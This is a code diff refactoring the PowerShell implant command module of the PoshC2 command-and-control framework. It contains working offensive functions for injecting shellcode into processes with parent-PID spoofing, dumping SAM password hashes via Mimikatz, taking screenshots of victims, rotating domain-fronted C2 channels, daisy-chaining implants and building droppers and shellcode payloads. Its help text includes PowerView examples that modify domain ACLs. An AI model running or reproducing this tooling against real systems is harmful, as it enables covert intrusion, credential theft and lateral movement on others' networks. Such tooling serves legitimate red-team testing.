-    impid = get_implantdetails(randomuri)
-    print_bad("**OPSEC Warning** - kill-process will terminate the entire process, if you want to kill the thread only use kill-implant")
-    ri = input("Are you sure you want to terminate the implant ID %s? (Y/n) " % impid.ImplantID)
-    if ri.lower() == "n":
-        print("Implant not terminated")
+@command(commands, commands_help, examples, block_help, name="exit")
+def do_kill_implant(user, command, implant_id):
+    """
+    Terminates this implant while leaving the process running and hides it from the ImplantHandler list.
+
+    Examples:
+        kill-implant
+    """
+    implant = get_implant(implant_id)
+    print_bad(
+        "**OPSEC Warning** - kill-implant terminates the current thread not the entire process, if you want to kill the process use kill-process")
+    ri = input(f"Are you sure you want to remove the implant ID {implant.numeric_id}? (Y/n) ")
+
     if ri == "" or ri.lower() == "y":
-        pid = impid.PID
-        new_task("get-process -id %s | kill" % (pid), user, randomuri)
-        kill_implant(randomuri)
+        new_task = NewTask(
+            implant_id=implant_id,
+            command="exit",
+            user=user,
+            child_implant_id=None
+        )
 
-
-def do_kill_implant(user, command, randomuri):
-    impid = get_implantdetails(randomuri)
-    print_bad("**OPSEC Warning** - kill-implant terminates the current threat not the entire process, if you want to kill the process use kill-process")
-    ri = input("Are you sure you want to remove the implant ID %s? (Y/n) " % impid.ImplantID)
-    if ri.lower() == "n":
+        insert_object(new_task)
+        update_object(Implant, {Implant.alive: "No"}, {Implant.id: implant_id})
+    else:
         print("Implant not removed")
-    if ri == "" or ri.lower() == "y":
-        new_task("exit", user, randomuri)
-        hide_implant(randomuri)
 
 
-def do_exit(user, command, randomuri):
-    return do_kill_implant(user, command, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_migrate(user, command, implant_id):
+    """
+    Migrates into a new process by injecting shellcode into that process.
 
+    Can either migrate into an already running process by specifying a PID or
+    create a new process and inject into it, with an optional parent PID to spoof.
 
-def do_migrate(user, command, randomuri):
+    New processes can be created suspended to prevent execution if desired.
+
+    RtlCreateUserThread can optionally be used to create the remote thread instead of CreateRemoteThread.
+
+    Examples:
+        migrate
+        migrate -procid 4444
+        migrate -procpath c:\\windows\\system32\\searchprotocolhost.exe -suspended -RtlCreateUserThread
+        migrate -procpath c:\\windows\\system32\\svchost.exe -suspended
+    """
     params = re.compile("migrate", re.IGNORECASE)
     params = params.sub("", command)
-    implant = get_implantdetails(randomuri)
-    implant_arch = implant.Arch
-    implant_comms = implant.Pivot
-    if implant_arch == "AMD64":
+    implant = get_implant(implant_id)
+    implant_type = ImplantType.get(implant.type)
+
+    if implant.architecture == "AMD64":
         arch = "64"
     else:
         arch = "86"
-    if implant_comms == "PS":
-        path = "%spayloads/Posh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, arch)
-        shellcodefile = load_file(path)
-    elif "Daisy" in implant_comms:
+
+    if implant_type == ImplantType.PowerShellHttpDaisy:
         daisyname = input("Name required: ")
-        path = "%spayloads/%sPosh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, daisyname, arch)
+        path = f"{PoshProjectDirectory}payloads/{daisyname}Posh_v4_x{arch}_Shellcode.bin"
         shellcodefile = load_file(path)
-    elif "Proxy" in implant_comms:
-        path = "%spayloads/ProxyPosh_v4_x%s_Shellcode.bin" % (PoshProjectDirectory, arch)
+    elif implant_type == ImplantType.PowerShellHttpProxy:
+        path = f"{PoshProjectDirectory}payloads/ProxyPosh_v4_x{arch}_Shellcode.bin"
         shellcodefile = load_file(path)
-    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
-    new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
-    new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
+    elif implant_type.is_powershell_implant():
+        path = f"{PoshProjectDirectory}payloads/Posh_v4_x{arch}_Shellcode.bin"
+        shellcodefile = load_file(path)
+    else:
+        print_bad(f"Unknown migration implant type: {implant_type}")
+        return
+
+    check_module_loaded("Inject-Shellcode.ps1", implant_id, user)
+    cmd = f"$Shellcode{arch}=\"{base64.b64encode(shellcodefile).decode('utf-8')}\" #{os.path.basename(path)}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+    cmd = f"Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode{arch})){params}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_loadmoudleforce(user, command, randomuri):
-    params = re.compile("loadmoduleforce ", re.IGNORECASE)
-    params = params.sub("", command)
-    check_module_loaded(params, randomuri, user, force=True)
+@command(commands, commands_help, examples, block_help)
+def do_invoke_daisychain(user, command, implant_id):
+    """
+    Calls Invoke-Daisychain to create a HTTP server in this implant
+    for daisy-chaining implants.
+
+    If unfamiliar with daisy-chaining, start-daisy is a more friendly way
+    to start daisy chaining implants.
+
+    Examples:
+        invoke-daisychain
+    """
+    check_module_loaded("Invoke-DaisyChain.ps1", implant_id, user)
+    urls = f"{select_first(C2Server.urls)},{select_first(C2Server.socks_urls)}"
+    cmd = f"{command} -URLs '{urls}'"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+    update_object(Implant, {Implant.label: "DAISY"}, {Implant.id: implant_id})
+    print("Use create-daisy-payload on implant handler to generate payloads.")
 
 
-def do_loadmodule(user, command, randomuri):
-    params = re.compile("loadmodule ", re.IGNORECASE)
-    params = params.sub("", command)
-    check_module_loaded(params, randomuri, user)
+@command(commands, commands_help, examples, block_help)
+def do_inject_shellcode(user, command, implant_id):
+    """
+    Inject shellcode into a target process, obtaining an implant in that process.
 
+    Prompts for the shellcode file to use.
+    Can either provide an executable to run and an optional parent PID to spoof,
+    or the PID of an already running process.
 
-def do_pbind_loadmodule(user, command, randomuri):
-    params = re.compile("pbind-loadmodule ", re.IGNORECASE)
-    params = params.sub("", command)
-    new_task(("pbind-loadmodule %s" % params), user, randomuri)
+    New processes can be created suspended to prevent execution if desired.
 
+    RtlCreateUserThread can optionally be used to create the remote thread instead of CreateRemoteThread.
 
-def do_invoke_daisychain(user, command, randomuri):
-    check_module_loaded("Invoke-DaisyChain.ps1", randomuri, user)
-    urls = get_allurls()
-    new_task("%s -URLs '%s'" % (command, urls), user, randomuri)
-    update_label("DaisyHost", randomuri)
-    print("Now use createdaisypayload")
-
-
-def do_inject_shellcode(user, command, randomuri):
+    Examples:
+        inject-shellcode -x86 -procid 5634 -parentId 1111
+        inject-shellcode -x64 -parentId 1111 -procpath 'c:\\windows\\system32\\svchost.exe' -suspended
+    """
     params = re.compile("inject-shellcode", re.IGNORECASE)
     params = params.sub("", command)
-    check_module_loaded("Inject-Shellcode.ps1", randomuri, user)
-    style = Style.from_dict({
-        '': '#80d130',
-    })
-    session = PromptSession(history=FileHistory('%s/.shellcode-history' % PoshProjectDirectory), auto_suggest=AutoSuggestFromHistory(), style=style)
+    check_module_loaded("Inject-Shellcode.ps1", implant_id, user)
+    session = PromptSession(history=FileHistory(f'{PoshProjectDirectory}/.shellcode-history'),
+                            auto_suggest=AutoSuggestFromHistory(), style=style)
+
     try:
-        path = session.prompt("Location of shellcode file: ", completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
+        path = session.prompt("Location of shellcode file: ",
+                              completer=FilePathCompleter(PayloadsDirectory, glob="*.bin"))
         path = PayloadsDirectory + path
     except KeyboardInterrupt:
         return
+
     try:
         shellcodefile = load_file(path)
+
         if shellcodefile is not None:
             arch = "64"
-            new_task("$Shellcode%s=\"%s\" #%s" % (arch, base64.b64encode(shellcodefile).decode("utf-8"), os.path.basename(path)), user, randomuri)
-            new_task("Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode%s))%s" % (arch, params), user, randomuri)
+            cmd = f"$Shellcode{arch}=\"{base64.b64encode(shellcodefile).decode('utf-8')}\" #{os.path.basename(path)}"
+            new_task = NewTask(
+                implant_id=implant_id,
+                command=cmd,
+                user=user,
+                child_implant_id=None
+            )
+
+            insert_object(new_task)
+            cmd = f"Inject-Shellcode -Shellcode ([System.Convert]::FromBase64String($Shellcode{arch})){params}"
+            new_task = NewTask(
+                implant_id=implant_id,
+                command=cmd,
+                user=user,
+                child_implant_id=None
+            )
+
+            insert_object(new_task)
     except Exception as e:
-        print_bad("Error loading file: %s" % e)
+        print_bad(f"Error loading file: {e}")
 
 
-def do_listmodules(user, command, randomuri):
-    modules = os.listdir(ModulesDirectory)
-    modules = sorted(modules, key=lambda s: s.lower())
-    print("")
-    print("[+] Available modules:")
-    print("")
-    for mod in modules:
-        if ".ps1" in mod:
-            print(mod)
+@command(commands, commands_help, examples, block_help)
+def do_ps(user, command, implant_id):
+    """
+    Gets the process listing for current host, displaying more information
+    than a standard PowerShell Get-Process.
+
+    Examples:
+        ps
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="get-processlist",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_modulesloaded(user, command, randomuri):
-    ml = get_implantdetails(randomuri)
-    print(ml.ModsLoaded)
+@command(commands, commands_help, examples, block_help)
+def do_hashdump(user, command, implant_id):
+    """
+    Extract password hashes from the local SAM.
+
+    Uses Invoke-Mimikatz.ps1 to run "lsadump::sam".
+
+    https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-Mimikatz.ps1
+
+    Examples:
+        hashdump
+    """
+    check_module_loaded("Invoke-Mimikatz.ps1", implant_id, user)
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="Invoke-Mimikatz -Command '\"lsadump::sam\"'",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_ps(user, command, randomuri):
-    new_task("get-processlist", user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_stop_daisy(user, command, implant_id):
+    """
+    Stop the Daisy HTTP server in this implant, if running.
+
+    Examples:
+        stop-daisy
+    """
+    update_object(Implant, {Implant.label: ""}, {Implant.id: implant_id})
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_hashdump(user, command, randomuri):
-    check_module_loaded("Invoke-Mimikatz.ps1", randomuri, user)
-    new_task("Invoke-Mimikatz -Command '\"lsadump::sam\"'", user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_reverse_dns(user, command, implant_id):
+    """
+    Perform a reverse DNS lookup on an IP address.
 
-
-def do_stopdaisy(user, command, randomuri):
-    update_label("", randomuri)
-    new_task(command, user, randomuri)
-
-
-def do_stopsocks(user, command, randomuri):
-    update_label("", randomuri)
-    new_task(command, user, randomuri)
-
-
-def do_sharpsocks(user, command, randomuri):
-    print(f"{Colours.RED}SharpSocks is not presently supported in the PowerShell implant{Colours.GREEN}")
-
-
-def do_reversedns(user, command, randomuri):
+    Examples:
+        reverse-dns 10.0.0.1
+    """
     params = re.compile("reversedns ", re.IGNORECASE)
     params = params.sub("", command)
-    new_task("[System.Net.Dns]::GetHostEntry(\"%s\")" % params, user, randomuri)
+    cmd = f"[System.Net.Dns]::GetHostEntry(\"{params}\")"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_rotation(user, command, randomuri):
+@command(commands, commands_help, examples, block_help)
+def do_enable_rotation(user, command, implant_id):
+    """
+    Enables comms rotation across multiple URLs.
+
+    Prompts the operator for a list of URLs to use, then an lists of
+    HTTP Host headers. There is a 1-to-1 relationship between the lists
+    and they must be the same size.
+
+    Examples:
+        enable-rotation
+    """
     domain = input("Domain or URL in array format: \"https://www.example.com\",\"https://www.example2.com\" ")
     domainfront = input("Domain front URL in array format: \"fjdsklfjdskl.cloudfront.net\",\"jobs.azureedge.net\" ")
-    new_task("set-variable -name rotdf -value %s" % domainfront, user, randomuri)
-    new_task("set-variable -name rotate -value %s" % domain, user, randomuri)
+    cmd = f"set-variable -name rotdf -value {domainfront}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+    cmd = f"set-variable -name rotate -value {domain}"
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=cmd,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_rotation(user, command, randomuri):
-    new_task("get-variable -name rotdf", user, randomuri)
-    new_task("get-variable -name rotate", user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_get_rotation(user, command, implant_id):
+    """
+    Retrieves the lists of URLs and HTTP Host headers in use for comms
+    rotation.
+
+    Examples:
+        get-rotation
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="get-variable -name rotdf",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+    new_task = NewTask(
+        implant_id=implant_id,
+        command="get-variable -name rotate",
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_shell(user, command, randomuri):
-    new_task(command, user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_shell(user, command, implant_id):
+    """
+    Runs a command directly on the PowerShell shell.
+
+    If a command is not recognised by PoshC2, this is the default action.
+
+    Examples:
+        shell get-process | select name,cpu | sort-object cpu -Descending
+        get-process | select name,cpu | sort-object cpu -Descending
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_screenshotmulti(user, command, randomuri):
-    pwrStatus = get_powerstatusbyrandomuri(randomuri)
-    if (pwrStatus is not None and pwrStatus[7]):
+@command(commands, commands_help, examples, block_help)
+def do_get_multi_screenshot(user, command, implant_id):
+    """
+    Gets multiple screenshots over a defined period, one screenshot per beacon.
+
+    Examples:
+        get-multi-screenshot 2m
+    """
+    pwrStatus = get_power_status(implant_id)
+
+    if pwrStatus is not None and pwrStatus.screen_locked:
         ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+
         if ri.lower() == "n" or ri.lower() == "":
             return
-    new_task(command, user, randomuri)
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_screenshot(user, command, randomuri):
-    pwrStatus = get_powerstatusbyrandomuri(randomuri)
-    if (pwrStatus is not None and pwrStatus[7]):
+@command(commands, commands_help, examples, block_help)
+def do_stop_multi_screenshot(user, command, implant_id):
+    """
+    Stops an existing get-multi-screenshot task.
+
+    Examples:
+        stop-multi-screenshot
+    """
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_get_screenshot(user, command, implant_id):
+    """
+    Gets a screenshot of the current desktop across all displays.
+
+    Examples:
+        get-screenshot
+    """
+    pwrStatus = get_power_status(implant_id)
+
+    if pwrStatus is not None and pwrStatus.screen_locked:
         ri = input("[!] Screen is reported as LOCKED, do you still want to attempt a screenshot? (y/N) ")
+
         if ri.lower() == "n" or ri.lower() == "":
             return
-    new_task(command, user, randomuri)
+
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_get_powerstatus(user, command, randomuri):
-    getpowerstatus(randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_get_powerstatus(user, command, implant_id):
+    """
+    Gets the PowerStatus of the target host.
+
+    Examples:
+        get-powerstatus
+    """
+    get_powerstatus(implant_id)
 
 
-def do_loadpowerstatus(user, command, randomuri):
-    update_label("PSM", randomuri)
-    new_task(command, user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_load_powerstatus(user, command, implant_id):
+    """
+    Load the PowerStatus monitoring into this implant for this host.
+
+    Examples:
+        load-powerstatus
+    """
+    update_object(Implant, {Implant.label: "PSM"}, {Implant.id: implant_id})
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
 
 
-def do_startdaisy(user, command, randomuri):
-    check_module_loaded("invoke-daisychain.ps1", randomuri, user)
+@command(commands, commands_help, examples, block_help)
+def do_start_daisy(user, command, implant_id):
+    """
+    Run a wizard to start daisy chaining, optionally creating new daisy payloads.
 
+    Examples:
+        start-daisy
+    """
+    check_module_loaded("invoke-daisychain.ps1", implant_id, user)
     elevated = input(Colours.GREEN + "Are you elevated? Y/n " + Colours.END)
-
     domain_front = ""
-    proxy_user = ""
-    proxy_pass = ""
+    proxy_username = ""
+    proxy_password = ""
     proxy_url = ""
-    cred_expiry = ""
+    credential_expiry = ""
 
     if elevated.lower() == "n":
-        cont = input(Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
+        cont = input(
+            Colours.RED + "Daisy from an unelevated context can only bind to localhost, continue? y/N " + Colours.END)
+
         if cont.lower() == "n" or cont == "":
             return
 
         bind_ip = "localhost"
-
     else:
         bind_ip = input(Colours.GREEN + "Bind IP on the daisy host: " + Colours.END)
 
     bind_port = input(Colours.GREEN + "Bind Port on the daisy host: " + Colours.END)
     firstdaisy = input(Colours.GREEN + "Is this the first daisy in the chain? Y/n? " + Colours.END)
     default_url = get_first_url(PayloadCommsHost, DomainFrontHeader)
-    default_df_header = get_first_dfheader(DomainFrontHeader)
+    default_df_header = get_first_domainfront_header(DomainFrontHeader)
+
     if default_df_header == default_url:
         default_df_header = None
+
     if firstdaisy.lower() == "y" or firstdaisy == "":
         upstream_url = input(Colours.GREEN + f"C2 URL (leave blank for {default_url}): " + Colours.END)
-        domain_front = input(Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
-        proxy_user = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
-        proxy_pass = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
+        domain_front = input(
+            Colours.GREEN + f"Domain front header (leave blank for {str(default_df_header)}): " + Colours.END)
+        proxy_username = input(Colours.GREEN + "Proxy user (<domain>\\<username>, leave blank if none): " + Colours.END)
+        proxy_password = input(Colours.GREEN + "Proxy password (leave blank if none): " + Colours.END)
         proxy_url = input(Colours.GREEN + "Proxy URL (leave blank if none): " + Colours.END)
-        cred_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")
+        credential_expiry = input(Colours.GREEN + "Password/Account Expiration Date: .e.g. 15/03/2018: ")
 
         if not upstream_url:
             upstream_url = default_url
+
         if not domain_front:
             if default_df_header:
                 domain_front = default_df_header
             else:
                 domain_front = ""
-
     else:
         upstream_daisy_host = input(Colours.GREEN + "Upstream daisy server:  " + Colours.END)
         upstream_daisy_port = input(Colours.GREEN + "Upstream daisy port:  " + Colours.END)
@@ -726,50 +1124,153 @@ def do_startdaisy(user, command, randomuri):
 
     if domain_front:
         command = command + f" -domfront {domain_front}"
+
     if proxy_url:
         command = command + f" -proxyurl '{proxy_url}'"
-    if proxy_user:
-        command = command + f" -proxyuser '{proxy_user}'"
-    if proxy_pass:
-        command = command + f" -proxypassword '{proxy_pass}'"
+
+    if proxy_username:
+        command = command + f" -proxyuser '{proxy_username}'"
+
+    if proxy_password:
+        command = command + f" -proxypassword '{proxy_password}'"
 
     if elevated.lower() == "y" or elevated == "":
-
         firewall = input(Colours.GREEN + "Add firewall rule? (uses netsh.exe) y/N: ")
+
         if firewall.lower() == "n" or firewall == "":
             command = command + " -nofwrule"
-
     else:
         print_good("Not elevated so binding to localhost and not adding firewall rule")
         command = command + " -localhost"
 
-    urls = get_allurls()
+    urls = f"{select_first(C2Server.urls)},{select_first(C2Server.socks_urls)}"
     command = command + f" -urls '{urls}'"
-    new_task(command, user, randomuri)
-    update_label("DaisyHost", randomuri)
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
 
+    insert_object(new_task)
+    update_object(Implant, {Implant.label: "DAISY"}, {Implant.id: implant_id})
     createpayloads = input(Colours.GREEN + "Would you like to create payloads for this Daisy Server? Y/n ")
 
     if createpayloads.lower() == "y" or createpayloads == "":
-
         name = input(Colours.GREEN + "Enter a payload name: " + Colours.END)
+        host_implant = get_implant(implant_id)
+        powershell_proxy_command = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
+        c2_server = select_first(C2Server)
+        url = URL(
+            name=name,
+            url=f"http://{bind_ip}:{bind_port}",
+            host_header="",
+            proxy_url=proxy_url,
+            proxy_username=proxy_username,
+            proxy_password=proxy_password,
+            credential_expiry=credential_expiry
+        )
 
-        daisyhost = get_implantdetails(randomuri)
-        proxynone = "if (!$proxyurl){$wc.Proxy = [System.Net.GlobalProxySelection]::GetEmptyWebProxy()}"
-        C2 = get_c2server_all()
-        urlId = new_urldetails(name, f"\"http://{bind_ip}:{bind_port}\"", "\"\"", proxy_url, proxy_user, proxy_pass, cred_expiry)
-        newPayload = Payloads(C2.KillDate, C2.EncKey, C2.Insecure, C2.UserAgent, C2.Referrer, "%s?d" % get_newimplanturl(), PayloadsDirectory, URLID=urlId, PowerShellProxyCommand=proxynone)
-        newPayload.PSDropper = (newPayload.PSDropper).replace("$pid;%s" % (upstream_url), "$pid;%s@%s" % (daisyhost.User, daisyhost.Domain))
-        newPayload.CreateDroppers(name)
-        newPayload.CreateRaw(name)
-        newPayload.CreateDlls(name)
-        newPayload.CreateShellcode(name)
-        newPayload.CreateEXE(name)
-        newPayload.CreateMsbuild(name)
-        print_good("Created new %s daisy payloads" % name)
+        insert_object(url)
+
+        if url.id:
+            new_payload = Payloads(
+                c2_server.kill_date,
+                c2_server.encryption_key,
+                c2_server.insecure,
+                c2_server.user_agent,
+                c2_server.referer,
+                f"{get_new_implant_url()}?d",
+                PayloadsDirectory,
+                url_id=url.id,
+                powershell_proxy_command=powershell_proxy_command
+            )
+
+            new_payload.ps_dropper = new_payload.ps_dropper.replace(f"$pid;{upstream_url}",
+                                                                    f"$pid;{host_implant.user}@{host_implant.domain}")
+            new_payload.create_droppers(f"{name}_")
+            new_payload.create_raw(f"{name}_")
+            new_payload.create_shellcode(f"{name}_")
+            new_payload.create_donut_shellcode(f"{name}_")
+            new_payload.create_dynamic_payloads(f"{name}_")
+            print_good(f"Created new {name} daisy payloads")
 
 
-def do_sharp(user, command, randomuri):
-    check = input(Colours.RED + "\nDid you mean to run this sharp command in a PS implant? y/N ")
-    if check.lower() == "y":
-        new_task(command, user, randomuri)
+@command(commands, commands_help, examples, block_help)
+def do_help(user, command, implant_id):
+    """
+    Displays a list of all the available commands for this implant, or
+    help for a particular command if specified.
+
+    Examples:
+        help
+        help list-modules
+        help inject-shellcode
+    """
+    print_command_help(command, commands, commands_help, block_help)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_search_help(user, command, implant_id):
+    """
+    Search the command list for commands containing the keyword.
+
+    The search is case insensitive.
+    The -verbose option will search within and print the help for each command also.
+
+    Examples:
+        search-help psexec
+        search-help -verbose psexec
+    """
+    search_help(command, commands_help)
+
+
+@command(commands, commands_help, examples, block_help)
+def do_powerview(user, command, implant_id):
+    """
+    Runs a command in PowerView, ensuring that PowerView.ps1 is loaded into memory.
+
+    If the module has already been loaded then cmdlets can just be run directly.
+
+    Examples:
+        get-objectacl -resolveguids -samaccountname john
+        add-objectacl -targetsamaccountname arobbins -principalsamaccountname harmj0y -rights resetpassword
+        get-netuser -admincount | select samaccountname
+        get-netuser -uacfilter not_accountdisable -properties samaccountname,pwdlastset
+        get-domainuser -uacfilter not_password_expired,not_accountdisable -properties samaccountname,pwdlastset | export-csv act.csv
+        get-netgroup -admincount | select samaccountname
+        get-netgroupmember "domain admins" -recurse|select membername
+        get-netcomputer | select-string -pattern "citrix"
+        get-netcomputer -filter operatingsystem=*7*|select name
+        get-netcomputer -filter operatingsystem=*2008*|select name
+        get-netcomputer -searchbase "LDAP://OU=Windows 2008 Servers,OU=ALL Servers,DC=poshc2,DC=co,DC=uk"|select name
+        get-netcomputer -domaincontroller internal.domain.com -domain internal.domain.com -Filter "(lastlogontimestamp>=$((Get-Date).AddDays(-30).ToFileTime()))(samaccountname=UK*)"|select name,lastlogontimestamp,operatingsystem
+        get-domaincomputer -ldapfilter "(|(operatingsystem=*7*)(operatingsystem=*2008*))" -spn "wsman*" -properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl
+        get-netgroup | select-string -pattern "internet"
+        get-netuser -filter | select-object samaccountname,userprincipalname
+        get-netuser -filter samaccountname=test
+        get-netuser -filter userprinciplename=test@test.com
+        get-netgroup | select samaccountname
+        get-netgroup "*ben*" | select samaccountname
+        get-netgroupmember "domain admins" -recurse|select membername
+        get-netshare hostname
+        get-netdomain | get-netdomaincontroller | get-netforestdomain
+        get-netforest | get-netforesttrust
+        get-netuser -domain child.parent.com -filter samaccountname=test
+        get-netgroup -domain child.parent.com | select samaccountname
+        get-domaingpouserlocalgroupmapping -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
+        get-domaingpouserlocalgroupmapping -LocalGroup RDP -Identity MYSPNUSER -Domain internal.domain.com -server dc01.internal.domain.com |select ComputerName -expandproperty ComputerName | fl
+        get-netdomaincontroller | select name | get-netsession | select *username,*cname
+        get-dfsshare | get-netsession | select *username,*cname
+        get-netfileserver | get-netsession | select *username,*cname
+    """
+    command = command[9:].strip()
+    check_module_loaded("powerview.ps1", implant_id, user)
+    new_task = NewTask(
+        implant_id=implant_id,
+        command=command,
+        user=user,
+        child_implant_id=None
+    )
+
+    insert_object(new_task)
